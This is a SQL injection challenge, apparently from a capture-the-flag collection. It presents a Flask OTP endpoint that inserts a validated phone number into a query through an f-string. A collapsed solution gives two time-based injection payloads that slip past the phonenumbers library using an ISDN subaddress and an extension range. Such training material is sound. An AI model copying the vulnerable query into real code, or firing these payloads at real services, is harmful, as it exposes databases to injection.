# Phone Number Validation
Is this app vulnerable to SQLi? Exploit it!
```python
import mysql.connector
from flask import Flask, request, jsonify
import phonenumbers, random
from config import DB_CONFIG

app = Flask(__name__)

@app.route('/send-otp', methods=['POST'])
def send_otp():
    try:
        phone_number = request.get_json().get("phone_number")
        if not phonenumbers.is_valid_number(phonenumbers.parse(f"+{phone_number}", None)):
            return jsonify({"error": "Invalid phone number"}), 400

        otp = random.randint(100000, 999999)
        conn = mysql.connector.connect(**DB_CONFIG)
        with conn.cursor() as cursor:
            cursor.execute(
                f"INSERT INTO otp_codes (phone_number, otp) VALUES ('{phone_number}', '{otp}')"
            )  # The phone_number column is VARCHAR(15)
        conn.commit()
        conn.close()

        send_otp_code(phone_number)  # Function to send SMS
        return jsonify({"message": "OTP code has been sent successfully"}), 200
    except:
        return jsonify({"error": "Something went wrong"}), 500

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=3000)

```

## Installation
Run the following command to deploy the challenge:
```bash
docker compose up -d
```

<details>
  <summary>Toggle to see the solution</summary>

  This challenge is vulnerable in several ways. Here are two of them:
  1. According to RFC 3966, an ISDN-Subaddress can follow the phone number.
  2. Library implementation also allows additional phone number ranges such as "x12/x34" after the phone number.

  Solution:
  ```json
  {
    // First Solution (RFC 3966) 
    "phone_number": "989123456789;isub=x', (SELECT SLEEP(10))) -- -",
    
    // Second Solution (Library) 
    "phone_number": "989123456789 x1/x2', (SELECT SLEEP(10))) -- -"
  }
  ```

</details>